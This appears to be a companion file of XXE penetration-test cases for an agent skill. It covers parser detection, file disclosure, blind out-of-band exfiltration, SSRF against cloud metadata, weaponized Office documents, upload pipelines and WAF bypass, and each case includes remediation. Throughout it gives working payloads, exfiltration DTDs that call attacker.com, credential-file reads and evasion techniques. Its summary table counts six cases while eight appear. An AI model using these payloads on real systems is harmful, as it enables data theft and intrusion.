# XXE Test Cases

> This file is a companion to `SKILL.md`, containing structured test cases organized by category and severity.

---

## Statistics

| Category | Count | Severity Range |
|----------|-------|----------------|
| A. XXE Detection | 1 | HIGH |
| B. File Disclosure | 1 | CRITICAL |
| C. Blind XXE | 1 | CRITICAL |
| D. XXE to SSRF | 1 | CRITICAL |
| E. OOB Exfiltration | 1 | CRITICAL |
| F. Office Document XXE | 1 | CRITICAL |
| **Total** | **6** | **HIGH - CRITICAL** |

---

## A. XXE Detection

### TC-XXE-001: XML External Entity Detection and Parser Validation

| Field | Value |
|------|------|
| **ID** | TC-XXE-001 |
| **Name** | XML External Entity Detection and Parser Validation |
| **Category** | A. XXE Detection |
| **Severity** | HIGH |
| **Prerequisites** | Target application has endpoints that accept XML input (SOAP, REST API with XML content type, file upload processing XML-based formats) |
| **Test Steps** | 1. Identify XML-processing endpoints: SOAP services, REST APIs accepting `application/xml` or `text/xml`, SVG upload endpoints, RSS/feed import endpoints<br>2. Send a valid XML request to confirm the parser accepts input<br>3. Inject basic XXE payload: `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://ATTACKER_OOB_DOMAIN/test">]><root>&xxe;</root>`<br>4. Monitor OOB callback server for HTTP/DNS interaction<br>5. If callback received, confirm parser resolves external entities<br>6. Test alternative Content-Type (`application/xml`) against JSON endpoints to discover hidden XML processing |
| **Expected Results** | OOB callback server receives HTTP request or DNS query from the target, confirming the XML parser resolves external entities |
| **Actual Impact** | Attacker confirms the XML parser is vulnerable to XXE, enabling further exploitation (file disclosure, SSRF, data exfiltration) |
| **Remediation** | Disable DTD processing entirely in the XML parser configuration. If DTDs are required, disable external entity resolution for both general and parameter entities |

---

## B. File Disclosure

### TC-XXE-002: Classic In-Band File Disclosure via XXE

| Field | Value |
|------|------|
| **ID** | TC-XXE-002 |
| **Name** | Classic In-Band File Disclosure via XXE |
| **Category** | B. File Disclosure |
| **Severity** | CRITICAL |
| **Prerequisites** | TC-XXE-001 confirmed the XML parser resolves external entities; parser returns entity content in the HTTP response (in-band) |
| **Test Steps** | 1. Inject file disclosure payload: `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>`<br>2. Submit to the vulnerable endpoint and inspect response body for file contents<br>3. If `/etc/passwd` content appears, confirm in-band file disclosure<br>4. Escalate to application configuration files: `file:///app/config/database.yml`, `file:///app/.env`, `file:///proc/self/environ`<br>5. On Windows targets, test `file:///C:/inetpub/wwwroot/web.config`<br>6. Document all successfully disclosed files and their sensitivity |
| **Expected Results** | HTTP response body contains the contents of the requested file, proving arbitrary file read from the server filesystem |
| **Actual Impact** | Attacker can read any file accessible to the application process, including configuration files with database credentials, API keys, environment variables, and sensitive application data |
| **Remediation** | Disable external entity resolution in the XML parser. Implement strict file permissions so the application process cannot read sensitive configuration files. Use environment variables or secret managers instead of file-based credential storage |

---

## C. Blind XXE

### TC-XXE-003: Blind XXE via OOB Parameter Entity Exploitation

| Field | Value |
|------|------|
| **ID** | TC-XXE-003 |
| **Name** | Blind XXE via OOB Parameter Entity Exploitation |
| **Category** | C. Blind XXE |
| **Severity** | CRITICAL |
| **Prerequisites** | TC-XXE-001 confirmed XML parser resolves external entities; in-band file disclosure (TC-XXE-002) failed because response does not include entity content |
| **Test Steps** | 1. Host a DTD file on attacker server (`http://attacker.com/xxe.dtd`):<br>`<!ENTITY % file SYSTEM "file:///etc/hostname"><!ENTITY % eval "<!ENTITY &#x25; send SYSTEM 'http://attacker.com/exfil?d=%file;'>">%eval;%send;`<br>2. Send parameter entity payload to target: `<!DOCTYPE foo [<!ENTITY % dtd SYSTEM "http://attacker.com/xxe.dtd">%dtd;]><root>test</root>`<br>3. Monitor attacker HTTP server for incoming request containing file content in query parameter<br>4. If HTTP is blocked, switch to DNS exfiltration: load file content as subdomain in DNS query<br>5. If DNS is blocked, try FTP exfiltration: `ftp://attacker.com:2121/%file;` with netcat listener<br>6. Use XXEinjector for automated multi-channel blind XXE: `ruby XXEinjector.rb --host=attacker.com --file=/etc/passwd --oob=http --verbose` |
| **Expected Results** | Attacker server receives OOB callback containing the target file content, proving blind XXE exfiltration works via parameter entity chains |
| **Actual Impact** | Attacker can exfiltrate any file readable by the application process through OOB channels, even without direct response reflection |
| **Remediation** | Disable parameter entity resolution in addition to general entities. Block outbound HTTP/DNS/FTP connections from the application server to untrusted destinations. Disable DTD processing entirely |

---

## D. XXE to SSRF

### TC-XXE-004: XXE to SSRF for Internal Service and Cloud Metadata Access

| Field | Value |
|------|------|
| **ID** | TC-XXE-004 |
| **Name** | XXE to SSRF for Internal Service and Cloud Metadata Access |
| **Category** | D. XXE to SSRF |
| **Severity** | CRITICAL |
| **Prerequisites** | TC-XXE-001 confirmed XML parser resolves external entities; target is deployed in a cloud environment or has internal network services |
| **Test Steps** | 1. Test cloud metadata access via XXE: `<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">`<br>2. Extract AWS IAM role credentials: `<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">`<br>3. For GCP targets: `<!ENTITY xxe SYSTEM "http://metadata.google.internal/computeMetadata/v1/">`<br>4. For Azure targets: `<!ENTITY xxe SYSTEM "http://169.254.169.254/metadata/instance?api-version=2021-02-01">`<br>5. Scan internal network services: `<!ENTITY xxe SYSTEM "http://192.168.1.1:6379/INFO">` (Redis), `<!ENTITY xxe SYSTEM "http://10.0.0.1:8080/">` (internal API)<br>6. For blind scenarios, use OOB DTD with SSRF target as the entity URL and exfiltrate via attacker server |
| **Expected Results** | XML parser makes HTTP requests to internal services or cloud metadata endpoints, returning internal network information or cloud credentials in the response or via OOB channels |
| **Actual Impact** | Attacker accesses cloud metadata to obtain temporary IAM credentials, internal API endpoints, database connection strings, and other sensitive infrastructure data |
| **Remediation** | Disable external entity resolution. Deploy network egress filtering to prevent the application server from accessing cloud metadata endpoints (169.254.169.254) and internal services. Use IMDSv2 on AWS instances |

---

## E. OOB Exfiltration

### TC-XXE-005: Multi-Channel OOB Data Exfiltration via XXE

| Field | Value |
|------|------|
| **ID** | TC-XXE-005 |
| **Name** | Multi-Channel OOB Data Exfiltration via XXE |
| **Category** | E. OOB Exfiltration |
| **Severity** | CRITICAL |
| **Prerequisites** | Blind XXE confirmed (TC-XXE-003); attacker controls a server accessible from the target network |
| **Test Steps** | 1. Set up HTTP listener: `nc -lvnp 80` or Python HTTP server<br>2. Construct multi-stage DTD payload that reads a target file and sends content via HTTP GET parameter<br>3. If HTTP exfiltration is blocked by egress filtering, switch to DNS: encode file content as subdomain in DNS query to attacker-controlled authoritative DNS server<br>4. If DNS is monitored, try FTP: `python3 -m pyftpdlib -p 2121` with DTD pointing to `ftp://attacker.com:2121/FILECONTENT`<br>5. Use Burp Collaborator for managed OOB infrastructure: monitor Collaborator tab for DNS/HTTP/SMTP interactions<br>6. Use xxeplus for WAF bypass: `python3 xxeplus.py --target http://target/api --method POST --payload blind-xxe --encode utf16`<br>7. Test UTF-16 encoded payloads to bypass WAF keyword detection on DOCTYPE/ENTITY/SYSTEM |
| **Expected Results** | Exfiltrated file content received on attacker server through at least one OOB channel (HTTP, DNS, or FTP) |
| **Actual Impact** | Attacker exfiltrates sensitive data through multiple OOB channels, bypassing network egress filters and WAF keyword detection |
| **Remediation** | Block all outbound connections from XML processing components except to explicitly whitelisted destinations. Deploy network monitoring to detect unusual outbound DNS queries, HTTP requests, or FTP connections from application servers. Disable DTD processing entirely |

---

## F. Office Document XXE

### TC-XXE-006: Weaponized Office Document XXE via OOXML Injection

| Field | Value |
|------|------|
| **ID** | TC-XXE-006 |
| **Name** | Weaponized Office Document XXE via OOXML Injection |
| **Category** | F. Office Document XXE |
| **Severity** | CRITICAL |
| **Prerequisites** | Target has a document management system, collaboration platform, or automated document processing pipeline that parses uploaded Office documents (DOCX, XLSX, PPTX) |
| **Test Steps** | 1. Use oxml_xxe to inject XXE payload into a legitimate DOCX template: `python3 oxml_xxe.py --file template.docx --inject --payload-file blind.dtd --output malicious.docx`<br>2. The DTD file contains OOB exfiltration payload targeting attacker server<br>3. Upload malicious.docx to the target document management system<br>4. Monitor attacker OOB server for callbacks triggered by server-side XML parsing<br>5. If DOCX is rejected, test XLSX format: `python3 oxml_xxe.py --file template.xlsx --inject --payload '<!ENTITY xxe SYSTEM "http://attacker.com/xlsx-callback">' --output malicious.xlsx`<br>6. Alternatively, manually craft payload: unzip DOCX, edit `word/document.xml` to add DOCTYPE entity, re-zip and upload<br>7. Test `[Content_Types].xml` injection for parsers that process this OOXML manifest file |
| **Expected Results** | Document management system parses the Office document server-side, resolving the injected XXE entity and triggering an OOB callback to the attacker server |
| **Actual Impact** | Attacker achieves XXE exploitation through social engineering delivery vector -- the weaponized document can be shared via email, collaboration platforms, or file sharing services, triggering server-side XML processing when the target system parses it |
| **Remediation** | Disable DTD processing and external entity resolution in all XML parsers used by the document processing pipeline. Implement file content inspection that rejects Office documents containing DOCTYPE declarations or external entity references. Validate documents against strict OOXML schemas before processing |

---

## G. Advanced XXE Bypass and Chained Attacks

### TC-XXE-007: XXE via File Upload Processing Pipeline

| Field | Value |
|------|-----|
| **ID** | TC-XXE-007 |
| **Name** | XXE via File Upload Processing Pipeline |
| **Category** | G. Advanced XXE Bypass and Chained Attacks |
| **Severity** | CRITICAL |
| **Prerequisites** | Target application has a file upload feature that processes XML-based formats server-side (SVG, DOCX, XLSX, PPTX, EPUB); attacker has identified the upload endpoint |
| **Objective** | Verify that server-side XML processing during file upload is vulnerable to XXE injection, enabling file disclosure or SSRF through the document processing pipeline |
| **Test Steps** | 1. Create malicious SVG with XXE payload targeting /etc/passwd<br>2. Upload the SVG through the application's file upload endpoint<br>3. Check if the processed/rendered SVG contains file contents in the response or preview<br>4. If in-band fails, create SVG with OOB callback to attacker server<br>5. Monitor attacker server for DNS/HTTP callbacks from the target<br>6. Test DOCX upload with injected DOCTYPE in word/document.xml<br>7. Test XLSX upload with injected entity in xl/sharedStrings.xml<br>8. Document all file types that trigger XML parsing and which are exploitable |
| **Expected Results** | At least one file upload type triggers server-side XML parsing that resolves external entities; file contents are disclosed either in-band (in the rendered preview) or out-of-band (via callback to attacker server); OOB callback confirms the target's XML parser resolves external entities |
| **Remediation** | Disable DTD processing in all XML parsers used by the file processing pipeline; implement file content validation before processing; reject files containing DOCTYPE declarations; use XML parsers in secure configuration (disallow external entities by default) |

### TC-XXE-008: WAF Bypass via Encoding and Obfuscation Techniques

| Field | Value |
|------|-----|
| **ID** | TC-XXE-008 |
| **Name** | WAF Bypass via Encoding and Obfuscation Techniques |
| **Category** | G. Advanced XXE Bypass and Chained Attacks |
| **Severity** | HIGH |
| **Prerequisites** | TC-XXE-001 confirmed the XML parser resolves external entities; a WAF or input validation filter is blocking standard XXE payloads; attacker controls a server for OOB callbacks |
| **Objective** | Verify that XXE payloads can bypass WAF keyword filtering through encoding, obfuscation, and alternative syntax techniques |
| **Test Steps** | 1. Test UTF-16 encoded payload: encode standard XXE payload as UTF-16 to bypass ASCII-based WAF keyword detection<br>2. Test XML comment obfuscation: insert XML comments within DOCTYPE/ENTITY keywords: `<!DOCTY<!-- -->PE ...>`<br>3. Test excessive whitespace: add newlines and spaces within the DOCTYPE declaration<br>4. Test PUBLIC vs SYSTEM keyword: replace SYSTEM with PUBLIC in entity declarations<br>5. Test gzip-compressed XML payload with Content-Encoding: gzip header<br>6. Test double URL encoding of the payload body<br>7. For each bypass attempt, monitor for successful OOB callback or file disclosure |
| **Expected Results** | At least one encoding or obfuscation technique bypasses the WAF filter and delivers a functional XXE payload to the XML parser; OOB callback is received confirming the parser resolved the entity; WAF does not detect or block the obfuscated payload |
| **Remediation** | Deploy WAF with multi-encoding awareness (UTF-16, gzip, base64); normalize XML input before filtering; block DOCTYPE declarations entirely regardless of encoding; implement schema validation that rejects unexpected entity declarations |
| **Pass Criteria** | At least one bypass technique successfully delivers XXE payload past the WAF; XML parser resolves the entity (confirmed by OOB callback or in-band response); WAF logs show no detection of the obfuscated payload |
